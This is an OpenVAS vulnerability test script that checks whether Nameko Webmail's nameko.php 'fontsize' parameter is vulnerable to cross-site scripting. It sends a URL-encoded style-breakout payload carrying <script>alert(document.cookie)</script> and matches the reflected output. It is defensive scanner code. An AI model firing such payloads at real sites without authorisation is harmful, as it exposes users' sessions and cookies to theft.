###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nameko_webmail_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Nameko Webmail Cross-Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application";

tag_affected = "Nameko Webmail version 0.10.146 and prior";
tag_insight = "Input passed via the 'fontsize' parameter to 'nameko.php' php script is not
  properly sanitised before being returned to the user.";
tag_solution = "Upgrade to version 1.9.999.10 or later
  For updates refer to http://sourceforge.net/projects/nameko";
tag_summary = "This host is running Nameko Webmail and is prone to cross-site
  scripting vulnerability.";

if(description)
{
  script_id(803826);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-08 14:53:58 +0530 (Mon, 08 Jul 2013)");
  script_name("Nameko Webmail Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122221/Nameko_Webmail_XSS.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/nameko-webmail-cross-site-scripting");
  script_summary("Check if Nameko Webmail is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "/NamekoWebmail", "/webmail", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/nameko.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('>Nameko' >< res && 'Shelf<' >< res)
  {
    ## Construct Attack Request
    url = dir + '/nameko.php?fontsize=22pt%3B%2B%7D%2B%3C%2Fstyle%3E%3C'+
                 'script%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C'+
                                   'style%3Ebody%2B%7B%2Bfont-size%3A22';

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port: port, url: url, check_header: TRUE,
       pattern: "<script>alert\(document.cookie\)</script>",
       extra_check: "font-size:22pt"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
